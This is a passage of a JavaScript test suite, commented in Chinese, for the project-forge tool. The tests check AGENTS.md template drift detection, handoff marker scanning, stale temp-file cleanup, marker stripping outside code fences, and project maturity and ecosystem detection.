        .map((m) => m[0])
        .filter((h) => h.includes('构建') && h.includes('验证')).length
      if (c.expect === 'need-build' && buildHits === 0) return `该补的构建节没补：${c.body.slice(0, 30)}`
      if (c.expect === 'no-dup-build' && buildHits > 1) return `构建节被重复追加了 ${buildHits} 份`
      const projectHits = (after.match(/^##\s+.*项目定位/gm) ?? []).length
      if (projectHits > 1) return `项目定位被重复追加了 ${projectHits} 份`
    }
    return true
  } finally { rmTree(dir) }
}])

cases.push(['目标项目自带 references/ 时，里面的标记照样扫得到', async () => {
  const dir = tmpProject({
    'README.md': '# a\n',
    'references/arch.md': '<!-- project-forge: begin 架构 -->\n# arch\n<!-- project-forge: end 架构 -->\n',
  })
  try {
    // 这条治的是一个假「干净」：把 references/ 一律当成 skill 自己的目录跳过，
    // 于是目标项目自己的 references/ 里那些标记永远扫不到，而 --verify 是交棒前唯一一道关。
    const r = await runNode('handoff.mjs', [dir, '--verify'])
    if (r.status === 0) return '目标项目 references/ 里有标记，--verify 却说干净'
    const j = JSON.parse((await runNode('handoff.mjs', [dir, '--json'])).stdout)
    if (!j.markers.some((m) => m.file === 'references/arch.md')) return '没扫到 references/ 里的标记'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['模板改了而本仓库实例没跟上时，--check 会红；刷新能把规则带回来', async () => {
  // 这一条守的是「自举只有结构、没有内容」：受管区间里没有 fill 的那几段，正文完全由事实
  // 推出来，本该与模板渲染结果逐字相同。模板加了规则而实例没跟上，必须有东西报出来，
  // 否则「它教别人做、自己没做到」会一路绿着过去。
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])

    // 先把所有占位填掉：漂移判据只在「已经填完」的契约上才有意义。
    const filled = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
      .replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')
    writeFileSync(join(dir, 'AGENTS.md'), filled)
    const good = await runNode('compose-agents.mjs', [dir, '--check'])
    if (good.status !== 0) return `填完之后就没过 --check：${(good.stderr || '').trim().split('\n')[0]}`

    // 模拟「模板加了规则、实例还停在旧版」：往受管区间里塞一条模板没有的内容。
    const text = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    // 锚在「同步不变量」那一行：它是这一段里最后一条固定规则，模板里一直有它。
    // 绑在别的行上时，那条规则一改名夹具就失效——而失效的样子是「夹具找不到插入点」，
    // 看起来像夹具坏了，实际是它依赖了一个会动的东西。
    const tampered = text.replace(
      /(- \*\*同步不变量\*\*)/,
      '- 这是实例里多出来的一条，模板里没有。\n\n$1',
    )
    if (tampered === text) return '夹具没找到可以插入的位置'
    writeFileSync(join(dir, 'AGENTS.md'), tampered)

    const drifted = await runNode('compose-agents.mjs', [dir, '--check'])
    if (drifted.status === 0) return '内容与模板不一致，--check 却放行了'
    if (!/与模板不一致/.test(drifted.stderr || '')) return `报错了但不是漂移那条判据：${(drifted.stderr || '').trim().split('\n')[0]}`

    await runNode('compose-agents.mjs', [dir])
    const after = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (after.includes('实例里多出来的一条')) return '刷新没有把实例拉回模板（多出来的内容还在）'
    if (!after.includes('同步不变量')) return '刷新把模板里的规则弄丢了'
    const again = await runNode('compose-agents.mjs', [dir, '--check'])
    if (again.status !== 0) return `刷新之后 --check 仍然红：${(again.stderr || '').trim().split('\n')[0]}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['默认分支名换个环境算出来不一样，不算漂移；真加了规则才算', async () => {
  // 受管区间里有一部分正文来自「跑在哪台机器上」：默认分支名可能取自 origin/HEAD（本地有、
  // 浅检出里常常没有），也可能取自 init.defaultBranch（开发机设了、CI 上没有）。同一个项目
  // 在两台机器上渲染出两个不同的分支名——那是换了个地方跑，不是模板变了。
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const filled = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
      .replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')
    writeFileSync(join(dir, 'AGENTS.md'), filled)

    const ok = await runNode('compose-agents.mjs', [dir, '--check'])
    if (ok.status !== 0) return `填完之后没过：${(ok.stderr || '').trim().split('\n')[0]}`

    // 模拟另一台机器：同一个项目、换一个默认分支名。
    const renamed = filled.replace(/git switch main\b/g, 'git switch trunk')
    if (renamed === filled) return '夹具没找到分支名'
    writeFileSync(join(dir, 'AGENTS.md'), renamed)
    const renamedCheck = await runNode('compose-agents.mjs', [dir, '--check'])
    if (renamedCheck.status !== 0) {
      return `换个分支名就被判成漂移了：${(renamedCheck.stderr || '').trim().split('\n')[0]}`
    }

    // 但真的多了一条模板里没有的规则，必须报。
    // 锚在「同步不变量」那一行——它是受管区间里最后一条固定规则，模板一直有它。
    // 绑在会随文档演进而改名的行上时，注入点失效，这条反面用例就悄悄变成了空跑。
    const drifted = renamed.replace(/(- \*\*同步不变量\*\*)/, '- 实例里多出来的一条。\n\n$1')
    if (drifted === renamed) return '夹具没找到可以插入的位置'
    writeFileSync(join(dir, 'AGENTS.md'), drifted)
    const driftCheck = await runNode('compose-agents.mjs', [dir, '--check'])
    if (driftCheck.status === 0) return '真漂移被掩码掩盖了'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['交棒扫到自己家时给「不适用」，既不是「干净」也不是「有痕迹」', async () => {
  // 交棒是「把一个项目从这套流程里摘出来」。skill 自己的仓库摘不出来——它就是这套流程，
  // 它的 templates/ 与 references/ 里的标记是语法与讲解，删掉会把工具弄坏。
  // 这里守的是「这个判断得由代码做，不是靠文档里写一句话」：
  // 判据是「目标目录等于脚本所在的 skill 根」，一条结构性事实，与它叫什么都无关。
  const self = SKILL_ROOT
  const verify = await runNode('handoff.mjs', [self, '--verify'])
  if (verify.status === 0) return '扫到自己家时说了「干净」——那会让下一个人以为可以删'
  if (verify.status === 1) return '扫到自己家时说了「还有痕迹」——那会让人去删自己的语法'
  if (verify.status !== 4) return `退出码应是 4（不适用），实际 ${verify.status}`

  const json = JSON.parse((await runNode('handoff.mjs', [self, '--json'])).stdout)
  if (json.selfScan !== true) return 'JSON 结果里没标出这是自扫'

  // 反面：换一个普通项目（哪怕它也有一份 SKILL.md），就必须按正常规则扫，不能误判成自扫。
  const other = tmpProject({
    'SKILL.md': '---\nname: project-forge\ndescription: 一个长得一样的副本\n---\n\n# 副本\n',
    'templates/x.md': '<!-- project-forge: begin x -->\n# x\n<!-- project-forge: end x -->\n',
  })
  try {
    const otherJson = JSON.parse((await runNode('handoff.mjs', [other, '--json'])).stdout)
    if (otherJson.selfScan !== false) return '一个同名的副本被误判成 skill 自己的仓库了'
    if (otherJson.total === 0) return '副本里的标记没扫到'
    const otherVerify = await runNode('handoff.mjs', [other, '--verify'])
    if (otherVerify.status !== 1) return `副本应报「还有痕迹」（1），实际 ${otherVerify.status}`
    return true
  } finally { rmTree(other) }
}])

cases.push(['有远端与没远端拿到的是两段不同的正文，不是同一段加一句', async () => {
  // 早先模板里写着「没有远端时只有本地提交」，但它不在任何条件块里——于是**有远端**的项目
  // 也照抄了这一句。读的人会以为自己漏了一步（远端明明配好了）。这类错误不报错，
  // 只让文档自相矛盾，所以两面都要立夹具。
  const withRemote = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  const withoutRemote = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    spawnSync('git', ['init', '-q', '-b', 'main'], { cwd: withRemote })
    spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'add', '-A'], { cwd: withRemote })
    spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-qm', 'init'], { cwd: withRemote })
    spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/a/b.git'], { cwd: withRemote })
    await runNode('compose-agents.mjs', [withRemote])
    await runNode('compose-agents.mjs', [withoutRemote])

    const a = readFileSync(join(withRemote, 'AGENTS.md'), 'utf8')
    const b = readFileSync(join(withoutRemote, 'AGENTS.md'), 'utf8')

    // 有远端：讲分支与 PR，不能出现「还没有远端」
    if (!a.includes('先核对远端与源仓库')) return '有远端的项目里缺了维护者/贡献者那段'
    if (a.includes('还没有远端')) return '有远端的项目里出现了「还没有远端」——自相矛盾'
    // 没远端：反过来，不能出现「从 main 拉新分支」这种要求
    if (!b.includes('还没有远端')) return '没远端的项目里缺了「只有本地提交」那段'
    if (b.includes('先核对远端与源仓库')) return '没远端的项目里出现了远端那一段'
    // 两边都必须保留独立审查这条底线——它不依赖远端
    if (!a.includes('独立审查') || !b.includes('独立审查')) return '两边都该讲独立审查，其中一边漏了'
    return true
  } finally { rmTree(withRemote); rmTree(withoutRemote) }
}])

cases.push(['契约里明确写了「日常只到推送、说发版才发」', async () => {
  // 这条守的是一条**行为边界**，不是措辞：默认只做提交 + 推送，发版要人点头。
  // 它容易在改写时被顺手删掉——因为读起来像一句废话。删掉之后没有东西会报错，
  // 只会在某一天由执行者自己判断「该发版了」，然后把一个撤不回的版本推出去。
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const text = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const need = [
      ['日常', '不打标签'],
      ['发版', '明确说'],
      ['不自己判断'],
      ['日常到此为止'],
    ]
    for (const words of need) {
      if (!words.every((w) => text.includes(w))) return `契约里缺了「${words.join(' + ')}」这条边界`
    }
    return true
  } finally { rmTree(dir) }
}])

// ── W1：lib 契约与围栏状态机 ─────────────────────────────────────────

cases.push(['apiTarget 只交出能直接用的地址；拼错的零件不会漏到调用方', async () => {
  const { apiTarget } = await import('../lib/protocol.mjs')
  const { apiEndpoint } = await import('../update.mjs')

  const target = apiTarget('https://github.com/acme/demo')
  if (!target) return '一个合法的 GitHub 地址却认不出来'
  if (!/^https:\/\/api\.github\.com\/repos\/acme\/demo\/releases\/latest$/.test(target.latest)) {
    return `latest 拼错：${target.latest}`
  }

  // 正面：主路真的拼得出一个完整地址，任何一段都不是 undefined。
  const endpoint = apiEndpoint('https://github.com/acme/demo')
  if (!endpoint || /undefined/.test(endpoint)) return `接口地址里有洞：${endpoint}`

  // 反面：不是 GitHub 的来源不猜，宁可让调用方走网页路。
  if (apiTarget('https://code.example.com/acme/demo') !== undefined) return '非 GitHub 地址也被拼出了接口地址'
  if (apiTarget('not a url') !== undefined) return '一段乱码被当成了地址'

  // 反面：排路时不能凭空多出接口路。
  const { routesFor } = await import('../update.mjs')
  const routes = routesFor('https://mirror.internal:9000')
  if (routes.some((r) => r.kind === 'api')) return '认不出的来源却排出了接口路'
  if (!routes.some((r) => r.kind === 'web')) return '网页路这条兜底没了'
  return true
}])

cases.push(['临时文件清理：传文件只清这个文件，传目录才扫全部；活的进程的不动', async () => {
  const { clearStaleTemps } = await import('../lib/fs-atomic.mjs')
  const d = mkdtempSync(join(tmpdir(), 'pf-temp-'))
  // 造一个**真的还活着**的别的进程：本进程自己的 pid 挡不住「属主活着」那条判据
  // （那条判据里另有 `pid === process.pid` 这一半），所以这里必须是一个陌生 pid。
  const other = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 60000)'], { stdio: 'ignore' })
  try {
    const f = join(d, 'a.md')
    writeFileSync(f, 'x')
    writeFileSync(`${f}.tmp-999999`, 'stale')                  // 死进程，该清
    writeFileSync(join(d, 'b.md.tmp-999998'), 'other stale')    // 别的文件，文件级不该碰
    writeFileSync(`${f}.tmp-${process.pid}`, 'mine')            // 本进程，不动
    writeFileSync(`${f}.tmp-${other.pid}`, 'live neighbour')    // 活着的别的进程，不动
    writeFileSync(`${f}.tmp-backup`, 'not ours')                // 后缀不是数字，不动

    // 正面：返回形状是对象，取 .kept 不抛（旧实现在这里当场 TypeError）。
    const one = clearStaleTemps(f)
    if (!Array.isArray(one.removed) || !Array.isArray(one.kept)) return '返回值不是 { removed, kept }'
    if (one.removed.length !== 1) return `文件级清掉了 ${one.removed.length} 个，应该只有 1 个`
    if (!one.kept.some((p) => p.endsWith(`.tmp-${process.pid}`))) return '本进程的临时文件没进 kept'
    // 关键的反面：活着的邻居进程那一份不许动。删掉「属主活着就留」这条判据时，
    // 唯一能抓到它的就是这个断言。
    if (!existsSync(`${f}.tmp-${other.pid}`)) return '删掉了另一个仍在运行的进程的临时文件'
    if (!existingKept(one, other.pid)) return '活进程的临时文件没进 kept，报告会漏说'
    if (!existsSync(join(d, 'b.md.tmp-999998'))) return '文件级清理越界删了别的文件的临时文件'
    if (!existsSync(`${f}.tmp-backup`)) return '后缀不是数字的也被删了'

    // 反面：换目录级，那一份就该被清掉。
    const all = clearStaleTemps(d, { dryRun: true })
    if (!all.removed.some((p) => p.endsWith('b.md.tmp-999998'))) return '目录级没有扫到别的临时文件'
    if (!existsSync(join(d, 'b.md.tmp-999998'))) return 'dryRun 模式下删了文件'
    return true
  } finally {
    other.kill()
    rmTree(d)
  }
}])

cases.push(['剥标记不碰围栏里的示例，也不碰行内代码里的举例', async () => {
  const { stripMarkers, parseMarkers } = await import('../lib/protocol.mjs')
  const F = '`'.repeat(3)
  const text = [
    '<!-- project-forge: begin 真节 -->',
    '正文。',
    '<!-- project-forge: end 真节 -->',
    '',
    `${F}md`,
    '<!-- project-forge: begin 示例 -->',
    F,
    '',
    '正文里举例：`<!-- project-forge: fill 行内示例 -->`',
  ].join('\n')

  // 正面：围栏外的真标记被剥掉。
  const stripped = stripMarkers(text, 'x.md')
  if (stripped.includes('begin 真节')) return '围栏外的真标记没被剥'
  // 反面：围栏里的示例与行内举例必须留着——那是内容，删掉就是删使用者自己的正文。
  if (!stripped.includes('begin 示例')) return '围栏里的示例被剥掉了'
  if (!stripped.includes('fill 行内示例')) return '行内代码里的举例被剥掉了'
  if (!stripped.includes(F)) return '围栏本身被剥掉了'

  // 解析这一侧也要一致：围栏里的不算标记。
  const kinds = parseMarkers(text, 'x.md').map((m) => `${m.kind}:${m.id ?? m.what}`)
  if (!kinds.includes('begin:真节')) return `真标记没解析出来：${kinds.join(',')}`
  if (kinds.some((k) => k.includes('示例'))) return `围栏里的示例被当成了真标记：${kinds.join(',')}`
  return true
}])

cases.push(['交棒扫描：行内代码里的路径不算悬空指针，临时文件单列一档', async () => {
  const d = tmpProject({
    'README.md': '正文里举例：`` `references/arch.md` `` 这句是示例。\n\n真引用：references/survey.md\n',
    'AGENTS.md.tmp-999999': 'stale tmp',
  })
  try {
    const r = JSON.parse((await runNode('handoff.mjs', [d, '--json'])).stdout)
    const targets = r.danglingPointers.map((p) => p.target)

    // 正面：真正的悬空指针还是报。
    if (!targets.includes('references/survey.md')) return `真悬空指针漏报了：${targets.join(',')}`
    // 反面：行内代码里举例的那个不许报。
    if (targets.includes('references/arch.md')) return '行内代码里的举例被当成了悬空指针'

    // 临时文件必须被扫到，而且是可清理的那一档。
    if (!Array.isArray(r.staleTemps) || r.staleTemps.length === 0) return '临时文件没被扫到'
    if (r.staleTemps.some((t) => t.alive)) return '把活进程的临时文件也当成了痕迹'
    if (r.clean) return '还有临时文件却说干净'
    return true
  } finally { rmTree(d) }
}])

cases.push(['compose --clean 顺手清掉自己写到一半留下的临时文件', async () => {
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const stale = join(dir, 'AGENTS.md.tmp-999999')
    writeFileSync(stale, 'half written')
    await runNode('compose-agents.mjs', [dir, '--clean'])
    if (existsSync(stale)) return '--clean 之后那个临时文件还在'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['入口守卫按真实路径判：经链接调用也真跑', async () => {
  // 反面（结构）：六个脚本都必须从 lib/text.mjs 取入口判定，不再各写一份。
  const files = ['survey.mjs', 'compose-agents.mjs', 'review.mjs', 'handoff.mjs', 'sync-toc.mjs', 'update.mjs']
  for (const name of files) {
    const text = readFileSync(join(SCRIPTS, name), 'utf8')
    if (!/isMainModule\(/.test(text)) return `${name} 没有用 isMainModule 判入口`
    if (/process\.argv\[1\]\s*&&\s*samePath/.test(text)) return `${name} 还留着一份自己的入口判定`
  }

  // 正面：通过一条符号链接调用，脚本必须真的跑。
  // 字面比较在链接上永远不相等，那种实现在这里是「退出 0、零输出」——而调用方
  // 会把它读成「检查通过」。这就是这一条要守的东西。
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  const link = join(dir, 'linked-survey.mjs')
  try {
    try {
      symlinkSync(join(SCRIPTS, 'survey.mjs'), link, 'file')
    } catch {
      return true  // 限制环境下建不了链接：结构断言已经足够，不把环境限制当成失败
    }
    const out = spawnSync(process.execPath, [link, dir], { encoding: 'utf8', timeout: 60000 })
    if (out.status !== 0) return `经链接调用失败了：${(out.stderr || '').trim().split('\n')[0]}`
    if (!/"maturity"/.test(out.stdout)) return '经链接调用时什么都没输出——入口判定把它挡在了门外'
    return true
  } finally { rmTree(dir) }
}])

// ── W3：存量项目融合 ────────────────────────────────────────────────

cases.push(['受管区间标 customized 之后，改它不报漂移、刷新也不冲掉', async () => {
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const fillAll = (text) => text.replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')

    // 正面：把「版本与发布」标成 customized，再塞一条项目自己的规矩。
    const customized = fillAll(readFileSync(join(dir, 'AGENTS.md'), 'utf8'))
      .replace('<!-- project-forge: begin 版本与发布 -->', '<!-- project-forge: begin 版本与发布 customized -->')
      .replace('## 版本管理与回滚底线\n', '## 版本管理与回滚底线\n\n- 本项目用 changesets 发版，发布由 CI 完成。\n')
    writeFileSync(join(dir, 'AGENTS.md'), customized)

    const ok = await runNode('compose-agents.mjs', [dir, '--check'])
    if (ok.status !== 0) return `标了 customized 还被判漂移：${(ok.stderr || '').trim().split('\n')[0]}`

    await runNode('compose-agents.mjs', [dir])
    if (!readFileSync(join(dir, 'AGENTS.md'), 'utf8').includes('changesets')) return '刷新把定制的那一段冲掉了'

    // 反面：把 flag 去掉，同一条定制必须重新算漂移——否则这个标记就成了「免检章」。
    const plain = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
      .replace('<!-- project-forge: begin 版本与发布 customized -->', '<!-- project-forge: begin 版本与发布 -->')
    writeFileSync(join(dir, 'AGENTS.md'), plain)
    const bad = await runNode('compose-agents.mjs', [dir, '--check'])
    if (bad.status === 0) return '去掉 customized 之后，定制内容仍被当成合格——那这条判据等于没有'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['手写契约删掉某一节的标记、留下同名小节时，不再追插一份', async () => {
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const text = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
      // 模拟「人把它接管了」：删掉这一对标记，正文原样留下。
      .replace('<!-- project-forge: begin 高风险路径 -->\n', '')
      .replace('<!-- project-forge: end 高风险路径 -->\n', '')
    writeFileSync(join(dir, 'AGENTS.md'), text)

    await runNode('compose-agents.mjs', [dir])
    const after = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const hits = (after.match(/^## 高风险路径.*$/gm) ?? []).length

    // 正面：标题还在，就不该插第二份。
    if (hits > 1) return `同一节被插了两份（${hits} 份）——接管过的节被追插了`
    if (hits === 0) return '正文被一起删掉了，那是另一回事'

    // 反面：连正文一起删掉时，照常补回来。
    const gone = after.replace(/^## 高风险路径[\s\S]*?(?=\n## |\n<!-- project-forge: begin |$)/m, '')
    writeFileSync(join(dir, 'AGENTS.md'), gone)
    await runNode('compose-agents.mjs', [dir])
    const restored = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (!/^## 高风险路径/m.test(restored)) return '整节被删掉之后没有补回来'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['空壳手写 AGENTS.md 不放行；内容充实的仍放行', async () => {
  const shell = tmpProject({
    'README.md': '# d\n\n说明足够长以通过长度检查。\n',
    'AGENTS.md': '# AGENTS\n\n一句话。\n',
  })
  try {
    // 正面：一行标题的空壳必须被拦下——它看起来像有契约，实际什么都没有。
    const bad = await runNode('compose-agents.mjs', [shell, '--check'])
    if (bad.status === 0) return '空壳手写契约被放行了'
    if (!/不算一份契约/.test(bad.stderr || '')) return `报错了但不是空壳那条判据：${(bad.stderr || '').trim().split('\n')[0]}`

    // 反面：一份认真的手写契约不许被误伤。
    const real = tmpProject({
      'README.md': '# d\n\n说明足够长以通过长度检查。\n',
      'AGENTS.md': [
        '# demo 工程契约',
        '',
        '## 定位',
        '',
        '这是一个命令行工具，负责把目录整理成规范项目。不做部署、不做选型。',
        '',
        '## 构建与测试',
        '',
        '```sh',
        'npm ci',
        'npm test',
        '```',
        '',
        '## 修改规范',
        '',
        '- 先看再动，贴合既有结构；',
        '- 改完跑一遍上面两条命令，全绿才算完成；',
        '- 不引入第三方依赖。',
        '',
        '这几条合起来讲清了「这是什么、怎么验、改动边界在哪」，长度也够。',
      ].join('\n'),
    })
    try {
      const ok = await runNode('compose-agents.mjs', [real, '--check'])
      if (ok.status !== 0) return `内容充实的手写契约被拦下了：${(ok.stderr || '').trim().split('\n')[0]}`
      return true
    } finally { rmTree(real) }
  } finally { rmTree(shell) }
}])

cases.push(['既有 AI 约定文件按文件展开、报告里点名、fill 提示列出', async () => {
  const dir = tmpProject({
    'README.md': '# d\n\n说明足够长以通过长度检查。\n',
    'package.json': '{"name":"d","version":"1.0.0","scripts":{"test":"node --test"}}',
    'CLAUDE.md': '# claude\n',
    '.clinerules': 'rule\n',
    '.cursor/rules/a.mdc': 'rule a\n',
    '.cursor/rules/b.mdc': 'rule b\n',
    '.changeset/config.json': '{}\n',
    'commitlint.config.js': 'module.exports = {}\n',
  })
  try {
    const f = await survey(dir)
    const others = f.docs.otherAiConventions
    // 正面：目录要展开成具体文件，不能只报一个目录名。
    if (!others.includes('.cursor/rules/a.mdc') || !others.includes('.cursor/rules/b.mdc')) {
      return `目录没展开：${others.join('、')}`
    }
    if (!others.includes('.clinerules')) return '漏了 .clinerules'
    if (!f.conventions.workflowTooling.includes('.changeset/')) return '没探到 .changeset/'
    if (!f.conventions.workflowTooling.includes('commitlint.config.js')) return '没探到 commitlint'

    // 报告里必须点名，否则读报告的人不知道项目里还有另一份约定。
    const md = (await runNode('survey.mjs', [dir, '--markdown'])).stdout
    if (!/既有 AI 规则文件/.test(md)) return 'Markdown 报告里没提别的 AI 约定文件'
    if (!md.includes('.cursor/rules/a.mdc')) return '报告里没列出具体文件'

    // fill 提示里也要列出来，AI 才有机会去合流。
    await runNode('compose-agents.mjs', [dir])
    const agents = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    if (!agents.includes('CLAUDE.md')) return 'fill 提示里没列出现有的约定文件'
    if (!agents.includes('.changeset/')) return 'fill 提示里没列出发版工具链'

    // 反面：一个干净的目录不该凭空多出这两项。
    const clean = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
    try {
      const g = await survey(clean)
      if (g.docs.otherAiConventions.length > 0) return '干净目录里凭空报出了别的约定文件'
      if (g.conventions.workflowTooling.length > 0) return '干净目录里凭空报出了发版工具链'
      return true
    } finally { rmTree(clean) }
  } finally { rmTree(dir) }
}])

// ── W4：场景适配 ────────────────────────────────────────────────────

cases.push(['命令按证据给：没有测试证据就不编一条', async () => {
  // 只有 requirements.txt 的 Python 项目：既不能 pip install -e .（没有 pyproject），
  // 也不该给 pytest（没有任何测试证据）。
  const plain = tmpProject({
    'README.md': '# d\n\n说明足够长。\n',
    'main.py': 'print(1)\n',
    'requirements.txt': 'requests\n',
  })
  try {
    const f = await survey(plain)
    if (f.commands.install !== 'pip install -r requirements.txt') return `install 是 ${f.commands.install}`
    if (f.commands.test !== undefined) return `凭空给了测试命令 ${f.commands.test}`

    // 反面（该有时必须有）：有 tests/ 就该给。
    const tested = tmpProject({
      'README.md': '# d\n\n说明足够长。\n',
      'main.py': 'print(1)\n',
      'requirements.txt': 'requests\n',
      'tests/test_a.py': 'def test_a():\n    assert True\n',
    })
    try {
      const g = await survey(tested)
      if (g.commands.test !== 'pytest') return `有 tests/ 却不给 pytest：${g.commands.test}`
      return true
    } finally { rmTree(tested) }
  } finally { rmTree(plain) }
}])

cases.push(['没有 gradlew 的 Gradle 项目用 gradle，有则用 ./gradlew', async () => {
  const noWrapper = tmpProject({
    'README.md': '# d\n\n说明足够长。\n',
    'build.gradle': 'plugins { id "java" }\n',
  })
  try {
    const f = await survey(noWrapper)
    if (!String(f.commands.build).startsWith('gradle ')) return `没有 gradlew 却用 ${f.commands.build}`
    if (String(f.commands.build).includes('./gradlew')) return './gradlew 在没有它的时候被用了'

    const withWrapper = tmpProject({
      'README.md': '# d\n\n说明足够长。\n',
      'build.gradle': 'plugins { id "java" }\n',
      'gradlew': '#!/bin/sh\n',
      'src/test/java/A.java': 'class A {}\n',
    })
    try {
      const g = await survey(withWrapper)
      if (!String(g.commands.build).startsWith('./gradlew')) return `有 gradlew 却用 ${g.commands.build}`
      if (g.commands.test !== './gradlew test') return `有测试证据却不给 test：${g.commands.test}`
      return true
    } finally { rmTree(withWrapper) }
  } finally { rmTree(noWrapper) }
}])

cases.push(['残缺血库不判 mature；六项齐全才是', async () => {
  const base = {
    'README.md': '# d\n\n说明足够长。\n',
    'index.js': 'console.log(1)\n',
    '.github/workflows/ci.yml': 'name: ci\non: [push]\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n',
  }
  const incomplete = tmpProject(base)
  const complete = tmpProject({
    ...base,
    // 六项齐全 = 有仓库 + README + AGENTS.md + .gitattributes + 远端 + CI。
    // 许可证不在「成熟度」里：放不放是**只有使用者能定**的事，它归体检的「待定」那一档。
    'LICENSE': 'MIT\n',
    'AGENTS.md': [
      '# d 工程契约', '', '## 定位', '',
      '这是一个演示项目，只用来跑夹具，不做别的事。', '',
      '## 构建与验证', '', '```sh', 'npm test', '```', '',
      '## 修改规范', '', '- 改完跑上面那条命令；', '- 不引入第三方依赖。',
    ].join('\n'),
    '.gitattributes': '* text=auto\n',
  })
  try {
    gitInit(incomplete)
    spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/demo.git'], { cwd: incomplete, stdio: 'ignore' })
    gitInit(complete)
    spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/demo2.git'], { cwd: complete, stdio: 'ignore' })
    // 本机署名是**本机事实**，不参与成熟度判定——但夹具要在两台虚拟机器上都稳定，
    // 所以给它一份确定的本地配置，免得依赖跑夹具那台机器的全局设置。
    for (const d of [incomplete, complete]) {
      spawnSync('git', ['config', 'user.name', 'fixture'], { cwd: d, stdio: 'ignore' })
      spawnSync('git', ['config', 'user.email', 'fixture@example.com'], { cwd: d, stdio: 'ignore' })
    }

    // 正面：缺 AGENTS.md 与 .gitattributes 的仓库，不该被当成「该有的都有」。
    const a = await survey(incomplete)
    if (a.maturity === 'mature') return '缺 AGENTS.md 与 .gitattributes 仍被判 mature'
    if (!textsOf(a.gaps).some((g) => /AGENTS\.md/.test(g))) return 'gaps 里没有「缺 AGENTS.md」'
    if (!textsOf(a.gaps).some((g) => /gitattributes/.test(g))) return 'gaps 里没有「缺 .gitattributes」'

    // 反面：六项齐全时必须是 mature——这条一旦翻车，所有正常项目都会被拖着做一遍多余的事。
    const b = await survey(complete)
    if (b.maturity !== 'mature') return `六项齐全却不是 mature（${b.maturity}）：${textsOf(b.gaps).join(' / ')}`
    return true
  } finally { rmTree(incomplete); rmTree(complete) }
}])

cases.push(['只有系统垃圾文件的目录判 empty，有一个真文件就不是', async () => {
  const junk = tmpProject({
    '.DS_Store': 'x',
    '.vscode/settings.json': '{}',
    'Thumbs.db': 'x',
  })
  const real = tmpProject({ '.DS_Store': 'x', 'notes.md': '# 随手记\n' })
  try {
    const a = await survey(junk)
    if (a.maturity !== 'empty') return `只有垃圾文件却判 ${a.maturity}`

    // 反面：有一个真文件，就不是「空目录」。
    const b = await survey(real)
    if (b.maturity === 'empty') return '有一个 .md 还被判成 empty'
    return true
  } finally { rmTree(junk); rmTree(real) }
}])

cases.push(['前后端分离：根目录没有清单时，一阶子目录里的生态要被认出来', async () => {
  const dir = tmpProject({
    'README.md': '# split\n\n前后端分离。\n',
    'frontend/package.json': '{"name":"web","version":"1.0.0","scripts":{"test":"vitest"}}',
    'backend/pyproject.toml': '[project]\nname = "api"\nversion = "1.0.0"\n',
    'backend/tests/test_api.py': 'def test_ok():\n    assert True\n',
  })
  try {
    const f = await survey(dir)
    if (!f.ecosystem.kinds.includes('node')) return `没认出前端：${f.ecosystem.kinds.join(',')}`
    if (!f.ecosystem.kinds.includes('python')) return `没认出后端：${f.ecosystem.kinds.join(',')}`
    const dirs = (f.ecosystem.subdirs ?? []).map((s) => s.dir)
    if (!dirs.includes('frontend') || !dirs.includes('backend')) return `subdirs 不全：${dirs.join(',')}`

    // 反面：根目录已经有清单时不下潜——那里的东西多半是依赖或示例，
    // 跟着扫会凭空多出几个生态，而多出来的会让 CI 去装根本不需要的工具链。
    const rooted = tmpProject({
      'README.md': '# d\n\n说明足够长。\n',
      'package.json': '{"name":"d","version":"1.0.0"}',
      'vendor/package.json': '{"name":"v","version":"0.0.1"}',
    })
    try {
      const g = await survey(rooted)
      if ((g.ecosystem.subdirs ?? []).length > 0) return '根目录已有清单，却还去扫了子目录'
      return true
    } finally { rmTree(rooted) }
  } finally { rmTree(dir) }
}])

cases.push(['纯 .vue 组件库不是「纯文档项目」', async () => {
  const dir = tmpProject({
    'README.md': '# ui\n\n一个组件库。\n',
